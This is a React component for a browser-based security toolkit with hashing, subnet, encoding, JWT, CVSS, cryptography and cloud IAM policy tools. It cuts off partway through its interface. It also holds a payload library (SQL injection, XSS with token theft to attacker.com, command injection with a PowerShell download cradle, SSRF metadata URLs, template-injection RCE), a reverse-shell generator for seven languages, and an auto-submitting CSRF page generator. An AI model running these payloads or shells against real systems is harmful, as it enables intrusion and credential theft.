import React, { useState, useEffect } from 'react';
import { useAuth } from '../../context/AuthContext';

// Helper: Bitwise Subnet Math
function calculateSubnet(ipStr, cidr) {
    try {
        const parts = ipStr.trim().split('.').map(Number);
        if (parts.length !== 4 || parts.some(p => isNaN(p) || p < 0 || p > 255) || cidr < 1 || cidr > 32) {
            return null;
        }
        const ipNum = ((parts[0] << 24) >>> 0) + ((parts[1] << 16) >>> 0) + ((parts[2] << 8) >>> 0) + (parts[3] >>> 0);
        const maskNum = cidr === 0 ? 0 : ((0xFFFFFFFF << (32 - cidr)) >>> 0);
        const netNum = (ipNum & maskNum) >>> 0;
        const bcastNum = (netNum | (~maskNum >>> 0)) >>> 0;

        const numToIp = (num) => [
            (num >>> 24) & 255,
            (num >>> 16) & 255,
            (num >>> 8) & 255,
            num & 255
        ].join('.');

        const netIp = numToIp(netNum);
        const bcastIp = numToIp(bcastNum);
        const netmask = numToIp(maskNum);
        const wildcard = numToIp(~maskNum >>> 0);

        const totalHosts = Math.pow(2, 32 - cidr);
        const usableHosts = cidr >= 31 ? (cidr === 31 ? 2 : 1) : Math.max(0, totalHosts - 2);

        let firstUsable = 'N/A';
        let lastUsable = 'N/A';
        if (cidr < 31) {
            firstUsable = numToIp(netNum + 1);
            lastUsable = numToIp(bcastNum - 1);
        } else if (cidr === 31) {
            firstUsable = netIp;
            lastUsable = bcastIp;
        } else {
            firstUsable = netIp;
            lastUsable = netIp;
        }

        return {
            netIp,
            bcastIp,
            netmask,
            wildcard,
            totalHosts,
            usableHosts,
            firstUsable,
            lastUsable
        };
    } catch (e) {
        return null;
    }
}

// Simple MD5 implementation for client-side hashing
function md5Cycle(x, k) {
    let a = x[0], b = x[1], c = x[2], d = x[3];
    a = ff(a, b, c, d, k[0], 7, -680876936);
    d = ff(d, a, b, c, k[1], 12, -389564586);
    c = ff(c, d, a, b, k[2], 17, 606105819);
    b = ff(b, c, d, a, k[3], 22, -1044525330);
    a = ff(a, b, c, d, k[4], 7, -176418897);
    d = ff(d, a, b, c, k[5], 12, 1200080426);
    c = ff(c, d, a, b, k[6], 17, -1473231341);
    b = ff(b, c, d, a, k[7], 22, -45705983);
    a = ff(a, b, c, d, k[8], 7, 1770035416);
    d = ff(d, a, b, c, k[9], 12, -1958414417);
    c = ff(c, d, a, b, k[10], 17, -42063);
    b = ff(b, c, d, a, k[11], 22, -1990404162);
    a = ff(a, b, c, d, k[12], 7, 1804603682);
    d = ff(d, a, b, c, k[13], 12, -40341101);
    c = ff(c, d, a, b, k[14], 17, -1502002290);
    b = ff(b, c, d, a, k[15], 22, 1236535329);
    a = gg(a, b, c, d, k[1], 5, -165796510);
    d = gg(d, a, b, c, k[6], 9, -1069501632);
    c = gg(c, d, a, b, k[11], 14, 643717713);
    b = gg(b, c, d, a, k[0], 20, -373897302);
    a = gg(a, b, c, d, k[5], 5, -701558691);
    d = gg(d, a, b, c, k[10], 9, 38016083);
    c = gg(c, d, a, b, k[15], 14, -660478335);
    b = gg(b, c, d, a, k[4], 20, -405537848);
    a = gg(a, b, c, d, k[9], 5, 568446438);
    d = gg(d, a, b, c, k[14], 9, -1019803690);
    c = gg(c, d, a, b, k[3], 14, -187363961);
    b = gg(b, c, d, a, k[8], 20, 1163531501);
    a = gg(a, b, c, d, k[13], 5, -1444681467);
    d = gg(d, a, b, c, k[2], 9, -51403784);
    c = gg(c, d, a, b, k[7], 14, 1735328473);
    b = gg(b, c, d, a, k[12], 20, -1926607734);
    a = hh(a, b, c, d, k[5], 4, -378558);
    d = hh(d, a, b, c, k[8], 11, -2022574463);
    c = hh(c, d, a, b, k[11], 16, 1839030562);
    b = hh(b, c, d, a, k[14], 23, -35309556);
    a = hh(a, b, c, d, k[1], 4, -1530992060);
    d = hh(d, a, b, c, k[4], 11, 1272893353);
    c = hh(c, d, a, b, k[7], 16, -155497632);
    b = hh(b, c, d, a, k[10], 23, -1094730640);
    a = hh(a, b, c, d, k[13], 4, 681279174);
    d = hh(d, a, b, c, k[0], 11, -358537222);
    c = hh(c, d, a, b, k[3], 16, -722521979);
    b = hh(b, c, d, a, k[6], 23, 76029189);
    a = hh(a, b, c, d, k[9], 4, -640364487);
    d = hh(d, a, b, c, k[12], 11, -421815835);
    c = hh(c, d, a, b, k[15], 16, 530742520);
    b = hh(b, c, d, a, k[2], 23, -995338651);
    a = ii(a, b, c, d, k[0], 6, -198630844);
    d = ii(d, a, b, c, k[7], 10, 1126891415);
    c = ii(c, d, a, b, k[14], 15, -1416354905);
    b = ii(b, c, d, a, k[5], 21, -57434055);
    a = ii(a, b, c, d, k[12], 6, 1700485571);
    d = ii(d, a, b, c, k[3], 10, -1894986606);
    c = ii(c, d, a, b, k[10], 15, -1051523);
    b = ii(b, c, d, a, k[1], 21, -2054922799);
    a = ii(a, b, c, d, k[8], 6, 1873313359);
    d = ii(d, a, b, c, k[15], 10, -30611744);
    c = ii(c, d, a, b, k[6], 15, -1560198380);
    b = ii(b, c, d, a, k[13], 21, 1309151649);
    a = ii(a, b, c, d, k[4], 6, -145523070);
    d = ii(d, a, b, c, k[11], 10, -1120210379);
    c = ii(c, d, a, b, k[2], 15, 718787259);
    b = ii(b, c, d, a, k[9], 21, -343485551);
    x[0] = add32(a, x[0]);
    x[1] = add32(b, x[1]);
    x[2] = add32(c, x[2]);
    x[3] = add32(d, x[3]);
}
function cmn(q, a, b, x, s, t) { a = add32(add32(a, q), add32(x, t)); return add32((a << s) | (a >>> (32 - s)), b); }
function ff(a, b, c, d, x, s, t) { return cmn((b & c) | ((~b) & d), a, b, x, s, t); }
function gg(a, b, c, d, x, s, t) { return cmn((b & d) | (c & (~d)), a, b, x, s, t); }
function hh(a, b, c, d, x, s, t) { return cmn(b ^ c ^ d, a, b, x, s, t); }
function ii(a, b, c, d, x, s, t) { return cmn(c ^ (b | (~d)), a, b, x, s, t); }
function add32(a, b) { return (a + b) & 0xFFFFFFFF; }
function md5(s) {
    const txt = unescape(encodeURIComponent(s));
    const n = txt.length, state = [1732584193, -271733879, -1732584194, 271733878], i = [];
    for (let j = 0; j < n; j++) i[j >> 2] |= (txt.charCodeAt(j) & 0xFF) << ((j % 4) * 8);
    i[n >> 2] |= 0x80 << ((n % 4) * 8);
    i[(((n + 8) >> 6) << 4) + 14] = n * 8;
    for (let j = 0; j < i.length; j += 16) {
        const blk = i.slice(j, j + 16);
        while (blk.length < 16) blk.push(0);
        md5Cycle(state, blk);
    }
    const hexChars = "0123456789abcdef";
    let res = "";
    for (let j = 0; j < 4; j++) {
        for (let k = 0; k < 4; k++) {
            const b = (state[j] >> (k * 8)) & 255;
            res += hexChars.charAt((b >> 4) & 15) + hexChars.charAt(b & 15);
        }
    }
    return res;
}

// ROT13
function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
        return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
    });
}

// Modular Exponentiation (base^exp % mod)
function modPow(base, exp, mod) {
    let res = 1n;
    base = BigInt(base) % BigInt(mod);
    exp = BigInt(exp);
    const m = BigInt(mod);
    while (exp > 0n) {
        if (exp % 2n === 1n) res = (res * base) % m;
        base = (base * base) % m;
        exp = exp / 2n;
    }
    return Number(res);
}

// Extended Euclidean Algorithm for modInverse
function modInverse(e, phi) {
    let [m0, y, x] = [phi, 0, 1];
    if (phi === 1) return 0;
    while (e > 1) {
        const q = Math.floor(e / phi);
        [e, phi] = [phi, e % phi];
        [x, y] = [y, x - q * y];
    }
    if (x < 0) x += m0;
    return x;
}

const PLAYLOAD_CATEGORIES = {
    sqli: {
        name: 'SQL Injection',
        desc: 'Authentication bypass, union extraction, and blind timing payloads.',
        payloads: [
            { name: "Auth Bypass Classic", code: "' OR '1'='1' -- " },
            { name: "Auth Bypass Admin", code: "admin' -- " },
            { name: "Union Schema Extraction", code: "' UNION SELECT null,table_name,column_name FROM information_schema.columns-- " },
            { name: "Time-Based Blind (PostgreSQL)", code: "'; SELECT pg_sleep(5);-- " },
            { name: "Time-Based Blind (MySQL)", code: "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- " }
        ]
    },
    xss: {
        name: 'Cross-Site Scripting (XSS)',
        desc: 'Reflected, stored, and DOM-based client-side JavaScript execution vectors.',
        payloads: [
            { name: "Basic Alert", code: "<script>alert(document.domain)</script>" },
            { name: "IMG Tag Auto-Execution", code: "<img src=x onerror=alert(document.cookie)>" },
            { name: "SVG Inline Payload", code: "<svg onload=alert(1)>" },
            { name: "Bypass Filter Lowercase", code: "<ScRiPt>alert(window.origin)</sCrIpT>" },
            { name: "Steal Token to Attacker Server", code: "<img src=x onerror=\"fetch('http://attacker.com/log?t='+localStorage.getItem('token'))\">" }
        ]
    },
    cmdi: {
        name: 'Command Injection',
        desc: 'Arbitrary shell execution vectors through OS command concatenators.',
        payloads: [
            { name: "Semicolon Concatenation", code: "; cat /etc/passwd" },
            { name: "Double Ampersand", code: "127.0.0.1 && whoami" },
            { name: "Subshell Execution", code: "$(id)" },
            { name: "Backtick Command", code: "`curl http://attacker.com`" },
            { name: "PowerShell Download Cradle", code: "; powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2/s')\"" }
        ]
    },
    ssrf: {
        name: 'SSRF & Cloud Metadata',
        desc: 'Accessing internal services, loopbacks, and AWS/GCP/Azure instance metadata.',
        payloads: [
            { name: "AWS EC2 IMDSv1 Metadata", code: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
            { name: "GCP Metadata Header Query", code: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" },
            { name: "Localhost Admin Endpoint", code: "http://127.0.0.1:8080/admin" },
            { name: "File Protocol Exfiltration", code: "file:///etc/passwd" }
        ]
    },
    ssti: {
        name: 'Server-Side Template Injection',
        desc: 'Remote code execution via Jinja2, Twig, and Freemarker template engines.',
        payloads: [
            { name: "Polyglot Probing", code: "{{7*7}} ${7*7} <%= 7*7 %>" },
            { name: "Jinja2 RCE (Popen)", code: "{{ ''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip() }}" },
            { name: "Twig RCE (PHP system)", code: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}" }
        ]
    }
};

const SAMPLE_IAM_POLICIES = [
    {
        name: "Lambda PassRole Privilege Escalation",
        json: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:PassRole",
        "lambda:CreateFunction",
        "lambda:InvokeFunction"
      ],
      "Resource": "*"
    }
  ]
}`
    },
    {
        name: "Wildcard Admin with S3 Public Access",
        json: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": "s3:PutObject",
      "Principal": "*",
      "Resource": "arn:aws:s3:::vault-backups/*"
    }
  ]
}`
    },
    {
        name: "Least Privilege Read-Only Policy (Secure)",
        json: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::app-public-assets",
        "arn:aws:s3:::app-public-assets/*"
      ]
    }
  ]
}`
    }
];

export default function ToolkitTab() {
    const { playChime } = useAuth();
    const [tool, setTool] = useState('hash');

    // Hash Gen state
    const [hashInput, setHashInput] = useState('admin');
    const [hashes, setHashes] = useState({ md5: '', sha1: '', sha256: '', sha512: '' });

    // Encoder state
    const [encInput, setEncInput] = useState('alert("XSS")');
    const [encMode, setEncMode] = useState('base64');
    const [encDirection, setEncDirection] = useState('encode');
    const [encOutput, setEncOutput] = useState('');

    // Subnet state
    const [ipInput, setIpInput] = useState('192.168.1.100');
    const [cidrInput, setCidrInput] = useState(24);

    // Reverse Shell state
    const [lhost, setLhost] = useState('10.10.14.5');
    const [lport, setLport] = useState('4444');
    const [shellType, setShellType] = useState('bash');

    // JWT Inspector state
    const [jwtInput, setJwtInput] = useState('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c');
    const [jwtDecoded, setJwtDecoded] = useState(null);

    // Defang state
    const [defangInput, setDefangInput] = useState('https://malicious-c2.example.com/payload.exe?ip=192.168.1.50');
    const [defangOutput, setDefangOutput] = useState('');

    // CVSS 3.1 Calculator state
    const [cvss, setCvss] = useState({
        av: 'N', ac: 'L', pr: 'N', ui: 'N', s: 'U', c: 'H', i: 'H', a: 'H'
    });

    // Payloads Playground state
    const [payloadCat, setPayloadCat] = useState('sqli');
    const [testPayload, setTestPayload] = useState("' OR '1'='1' -- ");

    // Web Exploit PoC Suite state
    const [csrfAction, setCsrfAction] = useState('http://target.corp/api/user/update-email');
    const [csrfMethod, setCsrfMethod] = useState('POST');
    const [csrfParams, setCsrfParams] = useState('email=hacker@evil.com&confirm=true');
    const [clickjackUrl, setClickjackUrl] = useState('http://bank.target.internal/account/delete');
    const [clickjackOpacity, setClickjackOpacity] = useState(40);

    // Cryptography Lab state
    const [rsaP, setRsaP] = useState(61);
    const [rsaQ, setRsaQ] = useState(53);
    const [rsaMsg, setRsaMsg] = useState(42);
    const [dhP, setDhP] = useState(23);
    const [dhG, setDhG] = useState(5);
    const [dhAliceA, setDhAliceA] = useState(6);
    const [dhBobB, setDhBobB] = useState(15);

    // API Security Suite state
    const [apiMode, setApiMode] = useState('bola'); // 'bola', 'mass_assign', 'oauth'
    const [bolaUserId, setBolaUserId] = useState('1001');
    const [massAssignRole, setMassAssignRole] = useState('admin');

    // Cloud IAM Validator state
    const [iamPolicyInput, setIamPolicyInput] = useState(SAMPLE_IAM_POLICIES[0].json);
    const [iamFindings, setIamFindings] = useState([]);

    // DNS & Subdomain Recon state
    const [reconDomain, setReconDomain] = useState('target.corp');

    const [copiedKey, setCopiedKey] = useState(null);

    const handleCopy = (text, key) => {
        navigator.clipboard.writeText(text);
        setCopiedKey(key);
        playChime();
        setTimeout(() => setCopiedKey(null), 2000);
    };

    // Calculate hashes
    const computeHashes = async (text) => {
        setHashInput(text);
        if (!text) {
            setHashes({ md5: '', sha1: '', sha256: '', sha512: '' });
            return;
        }
        try {
            const enc = new TextEncoder().encode(text);
            const [h1, h256, h512] = await Promise.all([
                crypto.subtle.digest('SHA-1', enc),
                crypto.subtle.digest('SHA-256', enc),
                crypto.subtle.digest('SHA-512', enc)
            ]);
            const toHex = b => Array.from(new Uint8Array(b)).map(x => x.toString(16).padStart(2, '0')).join('');
            setHashes({
                md5: md5(text),
                sha1: toHex(h1),
                sha256: toHex(h256),
                sha512: toHex(h512)
            });
        } catch (e) {
            setHashes({ md5: md5(text), sha1: 'Error', sha256: 'Error', sha512: 'Error' });
        }
    };

    useEffect(() => {
        computeHashes(hashInput);
    }, []);

    // IAM Policy Scanner logic
    const scanIamPolicy = (jsonStr) => {
        setIamPolicyInput(jsonStr);
        try {
            const parsed = JSON.parse(jsonStr);
            const findings = [];
            const statements = parsed.Statement || (Array.isArray(parsed) ? parsed : [parsed]);

            statements.forEach((st, idx) => {
                if (st.Effect !== 'Allow') return;
                const actions = Array.isArray(st.Action) ? st.Action : [st.Action];
                const resources = Array.isArray(st.Resource) ? st.Resource : [st.Resource];

                // Check 1: Wildcard Action *
                if (actions.includes('*') || actions.some(a => a && a.endsWith(':*') && ['iam:*', 'sts:*', 'ec2:*'].includes(a))) {
                    findings.push({
                        severity: 'CRITICAL',
                        title: `Full Administrative Wildcard Action (${actions.join(', ')})`,
                        desc: `Statement #${idx + 1} grants unrestricted API access, violating least privilege.`
                    });
                }

                // Check 2: iam:PassRole Privilege Escalation
                if (actions.includes('iam:PassRole') && (resources.includes('*') || actions.includes('lambda:CreateFunction') || actions.includes('ec2:RunInstances'))) {
                    findings.push({
                        severity: 'CRITICAL',
                        title: 'Dangerous Privilege Escalation via iam:PassRole',
                        desc: `Allows passing higher-privileged service roles to AWS compute resources (Lambda/EC2), achieving full account takeover.`
                    });
                }

                // Check 3: Public S3 Write Access
                if (st.Principal === '*' || (st.Principal && st.Principal.AWS === '*')) {
                    findings.push({
                        severity: 'HIGH',
                        title: 'Public Anonymous Bucket Access (Principal: "*")',
                        desc: 'Any anonymous internet user can access or write objects into this S3 storage bucket.'
                    });
                }
            });

            if (findings.length === 0) {
                findings.push({
                    severity: 'CLEAN',
                    title: 'Least-Privilege Compliant Policy',
                    desc: 'No high-risk privilege escalation or public wildcard permissions identified.'
                });
            }
            setIamFindings(findings);
        } catch (e) {
            setIamFindings([{ severity: 'ERROR', title: 'Invalid JSON Syntax', desc: e.message }]);
        }
    };

    useEffect(() => {
        scanIamPolicy(iamPolicyInput);
    }, []);

    // Encoder logic
    const handleTransform = (text, mode, direction) => {
        setEncInput(text);
        if (!text) { setEncOutput(''); return; }
        try {
            if (direction === 'encode') {
                if (mode === 'base64') setEncOutput(btoa(unescape(encodeURIComponent(text))));
                else if (mode === 'hex') setEncOutput(Array.from(new TextEncoder().encode(text)).map(b => '\\x' + b.toString(16).padStart(2, '0')).join(''));
                else if (mode === 'url') setEncOutput(encodeURIComponent(text));
                else if (mode === 'html') setEncOutput(text.replace(/[\u00A0-\u9999<>\&]/g, i => '&#' + i.charCodeAt(0) + ';'));
                else if (mode === 'rot13') setEncOutput(rot13(text));
            } else {
                if (mode === 'base64') setEncOutput(decodeURIComponent(escape(atob(text.trim()))));
                else if (mode === 'hex') {
                    const clean = text.replace(/\\x|\s|0x/g, '');
                    const bytes = [];
                    for (let i = 0; i < clean.length; i += 2) bytes.push(parseInt(clean.substr(i, 2), 16));
                    setEncOutput(new TextDecoder().decode(new Uint8Array(bytes)));
                }
                else if (mode === 'url') setEncOutput(decodeURIComponent(text));
                else if (mode === 'html') {
                    const doc = new DOMParser().parseFromString(text, 'text/html');
                    setEncOutput(doc.documentElement.textContent || '');
                }
                else if (mode === 'rot13') setEncOutput(rot13(text));
            }
        } catch (e) {
            setEncOutput('[ERR] Transformation failed: ' + e.message);
        }
    };

    const subnetInfo = calculateSubnet(ipInput, parseInt(cidrInput, 10));

    const SHELL_TEMPLATES = {
        bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
        python: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
        powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
        netcat: `nc -e /bin/bash ${lhost} ${lport}`,
        socat: `socat TCP4:${lhost}:${lport} EXEC:/bin/bash`,
        php: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        ruby: `ruby -rsocket -e'f=TCPSocket.open("${lhost}",${lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`
    };

    const decodeJwt = (token) => {
        setJwtInput(token);
        if (!token || !token.includes('.')) {
            setJwtDecoded(null);
            return;
        }
        try {
            const parts = token.trim().split('.');
            if (parts.length < 2) return;
            const header = JSON.parse(decodeURIComponent(escape(atob(parts[0]))));
            const payload = JSON.parse(decodeURIComponent(escape(atob(parts[1]))));
            setJwtDecoded({ header, payload, sig: parts[2] || '' });
        } catch (e) {
            setJwtDecoded({ error: 'Invalid JWT structure or malformed base64' });
        }
    };

    const handleDefang = (text, defang) => {
        setDefangInput(text);
        if (!text) { setDefangOutput(''); return; }
        if (defang) {
            const out = text
                .replace(/https?:\/\//gi, match => match.toLowerCase().startsWith('https') ? 'hxxps://' : 'hxxp://')
                .replace(/\./g, '[.]')
                .replace(/@/g, '[@]');
            setDefangOutput(out);
        } else {
            const out = text
                .replace(/hxxps:\/\//gi, 'https://')
                .replace(/hxxp:\/\//gi, 'http://')
                .replace(/\[\.\]/g, '.')
                .replace(/\[@\]/g, '@');
            setDefangOutput(out);
        }
    };

    // CVSS 3.1 live calculation
    const cvssScore = (() => {
        const avMap = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 };
        const acMap = { L: 0.77, H: 0.44 };
        const prMapU = { N: 0.85, L: 0.62, H: 0.27 };
        const prMapC = { N: 0.85, L: 0.68, H: 0.50 };
        const uiMap = { N: 0.85, R: 0.62 };
        const ciaMap = { N: 0.0, L: 0.22, H: 0.56 };

        const prVal = cvss.s === 'U' ? prMapU[cvss.pr] : prMapC[cvss.pr];
        const iss = 1 - ((1 - ciaMap[cvss.c]) * (1 - ciaMap[cvss.i]) * (1 - ciaMap[cvss.a]));
        if (iss <= 0) return { score: '0.0', severity: 'None', vector: `CVSS:3.1/AV:${cvss.av}/AC:${cvss.ac}/PR:${cvss.pr}/UI:${cvss.ui}/S:${cvss.s}/C:${cvss.c}/I:${cvss.i}/A:${cvss.a}` };

        const impact = cvss.s === 'U' ? 6.42 * iss : 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
        const exploitability = 8.22 * avMap[cvss.av] * acMap[cvss.ac] * prVal * uiMap[cvss.ui];

        let base = cvss.s === 'U' ? Math.min(impact + exploitability, 10) : Math.min(1.08 * (impact + exploitability), 10);
        base = Math.ceil(base * 10) / 10;
        const scoreStr = base.toFixed(1);

        let severity = 'Low';
        if (base >= 9.0) severity = 'Critical';
        else if (base >= 7.0) severity = 'High';
        else if (base >= 4.0) severity = 'Medium';

        const vector = `CVSS:3.1/AV:${cvss.av}/AC:${cvss.ac}/PR:${cvss.pr}/UI:${cvss.ui}/S:${cvss.s}/C:${cvss.c}/I:${cvss.i}/A:${cvss.a}`;
        return { score: scoreStr, severity, vector };
    })();

    // Generated CSRF PoC HTML
    const csrfHtml = (() => {
        const paramPairs = csrfParams.split('&').map(pair => {
            const [k, v] = pair.split('=');
            return `<input type="hidden" name="${k || ''}" value="${v || ''}" />`;
        }).join('\n      ');

        return `<!-- CSRF Proof-of-Concept Exploit Generated by E-Hacker -->
<html>
  <body>
    <h1>Exploit Delivery in Progress...</h1>
    <form id="csrfForm" action="${csrfAction}" method="${csrfMethod}">
      ${paramPairs}
    </form>
    <script>
      document.getElementById('csrfForm').submit();
    </script>
  </body>
</html>`;
    })();

    // RSA Math Calculation
    const rsaComputed = (() => {
        const p = parseInt(rsaP, 10) || 61;
        const q = parseInt(rsaQ, 10) || 53;
        const m = parseInt(rsaMsg, 10) || 42;
        const n = p * q;
        const phi = (p - 1) * (q - 1);
        const e = 17; // standard small coprime exponent
        const d = modInverse(e, phi);
        const ciphertext = modPow(m, e, n);
        const decrypted = modPow(ciphertext, d, n);
        return { p, q, n, phi, e, d, m, ciphertext, decrypted };
    })();

    // Diffie-Hellman Calculation
    const dhComputed = (() => {
        const p = parseInt(dhP, 10) || 23;
        const g = parseInt(dhG, 10) || 5;
        const a = parseInt(dhAliceA, 10) || 6;
        const b = parseInt(dhBobB, 10) || 15;
        const A = modPow(g, a, p); // Alice public
        const B = modPow(g, b, p); // Bob public
        const secretAlice = modPow(B, a, p);
        const secretBob = modPow(A, b, p);
        return { p, g, a, b, A, B, secretAlice, secretBob };
    })();

    return (
        <div className="tab-panel active">
            {/* Header Hub Card */}
            <div className="glass-card mb-25" style={{ background: 'linear-gradient(135deg, rgba(6, 182, 212, 0.06) 0%, rgba(124, 58, 237, 0.06) 100%)', borderColor: 'rgba(6, 182, 212, 0.3)' }}>
                <div className="flex-space-between-center flex-wrap gap-15">
                    <div>
                        <div className="projects-badge-tag">CLIENT-SIDE OFFENSIVE & DEFENSIVE SUITE</div>
                        <h2 style={{ margin: '4px 0 2px 0' }}>Cyber Toolkit, Cloud IAM & Security Sandbox</h2>
                        <p style={{ color: 'var(--text-secondary)', fontSize: '0.92rem' }}>
                            AWS/GCP Cloud IAM validator, DNS & subdomain recon, OWASP API Top 10 tester, zero-telemetry crypto lab, and CVSS 3.1 estimator.
                        </p>
                    </div>

                    <div className="ai-nav-chips">
                        <button className={`ai-nav-btn ${tool === 'hash' ? 'active' : ''}`} onClick={() => { setTool('hash'); playChime(); }}>
                            Multi-Hash
                        </button>
                        <button className={`ai-nav-btn ${tool === 'iam' ? 'active' : ''}`} onClick={() => { setTool('iam'); playChime(); }}>
                            Cloud IAM Validator
                        </button>
                        <button className={`ai-nav-btn ${tool === 'dns' ? 'active' : ''}`} onClick={() => { setTool('dns'); playChime(); }}>
                            DNS & Subdomain Recon
                        </button>
                        <button className={`ai-nav-btn ${tool === 'api' ? 'active' : ''}`} onClick={() => { setTool('api'); playChime(); }}>
                            OWASP API Security
                        </button>
                        <button className={`ai-nav-btn ${tool === 'encoder' ? 'active' : ''}`} onClick={() => { setTool('encoder'); playChime(); }}>
                            Encoder / Decoder
                        </button>
                        <button className={`ai-nav-btn ${tool === 'cvss' ? 'active' : ''}`} onClick={() => { setTool('cvss'); playChime(); }}>
                            CVSS 3.1
                        </button>
                        <button className={`ai-nav-btn ${tool === 'csrf' ? 'active' : ''}`} onClick={() => { setTool('csrf'); playChime(); }}>
                            Web PoC Suite
                        </button>
                        <button className={`ai-nav-btn ${tool === 'crypto' ? 'active' : ''}`} onClick={() => { setTool('crypto'); playChime(); }}>
                            Cryptography Lab
                        </button>
                        <button className={`ai-nav-btn ${tool === 'payloads' ? 'active' : ''}`} onClick={() => { setTool('payloads'); playChime(); }}>
                            Payloads
                        </button>
                        <button className={`ai-nav-btn ${tool === 'subnet' ? 'active' : ''}`} onClick={() => { setTool('subnet'); playChime(); }}>
                            Subnet Math
                        </button>
                        <button className={`ai-nav-btn ${tool === 'revshell' ? 'active' : ''}`} onClick={() => { setTool('revshell'); playChime(); }}>
                            Reverse Shells
                        </button>
                        <button className={`ai-nav-btn ${tool === 'jwt' ? 'active' : ''}`} onClick={() => { setTool('jwt'); playChime(); }}>
                            JWT Inspector
                        </button>
                        <button className={`ai-nav-btn ${tool === 'defang' ? 'active' : ''}`} onClick={() => { setTool('defang'); playChime(); }}>
                            IOC Defanger
                        </button>
                    </div>
                </div>
            </div>

            {/* 1. Multi-Hash Generator */}
            {tool === 'hash' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">Multi-Hash Cryptographic Generator</h3>
                    <div className="tool-input-group mt-15 mb-20">
                        <label className="tool-input-label">PLAINTEXT STRING / PAYLOAD:</label>
                        <input
                            type="text"
                            className="search-input"
                            style={{ width: '100%' }}
                            value={hashInput}
                            placeholder="Enter text to hash..."
                            onChange={(e) => computeHashes(e.target.value)}
                        />
                    </div>

                    <div className="overview-grid">
                        <div className="glass-card" style={{ margin: 0 }}>
                            <div className="flex-space-between-center mb-6">
                                <span className="channel-badge" style={{ background: 'rgba(6, 182, 212, 0.15)', color: '#22d3ee' }}>MD5 (128-BIT)</span>
                                <button className="table-action-link" onClick={() => handleCopy(hashes.md5, 'md5')}>{copiedKey === 'md5' ? 'Copied!' : 'Copy'}</button>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ wordBreak: 'break-all' }}>{hashes.md5 || '---'}</div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <div className="flex-space-between-center mb-6">
                                <span className="channel-badge" style={{ background: 'rgba(234, 179, 8, 0.15)', color: '#fde047' }}>SHA-1 (160-BIT)</span>
                                <button className="table-action-link" onClick={() => handleCopy(hashes.sha1, 'sha1')}>{copiedKey === 'sha1' ? 'Copied!' : 'Copy'}</button>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ wordBreak: 'break-all' }}>{hashes.sha1 || '---'}</div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <div className="flex-space-between-center mb-6">
                                <span className="channel-badge" style={{ background: 'rgba(34, 197, 94, 0.15)', color: '#4ade80' }}>SHA-256 (256-BIT)</span>
                                <button className="table-action-link" onClick={() => handleCopy(hashes.sha256, 'sha256')}>{copiedKey === 'sha256' ? 'Copied!' : 'Copy'}</button>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ wordBreak: 'break-all' }}>{hashes.sha256 || '---'}</div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <div className="flex-space-between-center mb-6">
                                <span className="channel-badge" style={{ background: 'rgba(168, 85, 247, 0.15)', color: '#c084fc' }}>SHA-512 (512-BIT)</span>
                                <button className="table-action-link" onClick={() => handleCopy(hashes.sha512, 'sha512')}>{copiedKey === 'sha512' ? 'Copied!' : 'Copy'}</button>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ wordBreak: 'break-all' }}>{hashes.sha512 || '---'}</div>
                        </div>
                    </div>
                </div>
            )}

            {/* 2. Cloud IAM Policy Validator & Privilege Escalation Scanner */}
            {tool === 'iam' && (
                <div className="glass-card">
                    <div className="flex-space-between-center flex-wrap gap-15 mb-20">
                        <div>
                            <h3 className="tool-section-title" style={{ margin: 0 }}>AWS & Cloud IAM Policy Security Analyzer</h3>
                            <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', margin: '4px 0 0 0' }}>
                                Scans IAM Policy JSON documents for dangerous PassRole escalations, admin wildcards, and anonymous access.
                            </p>
                        </div>

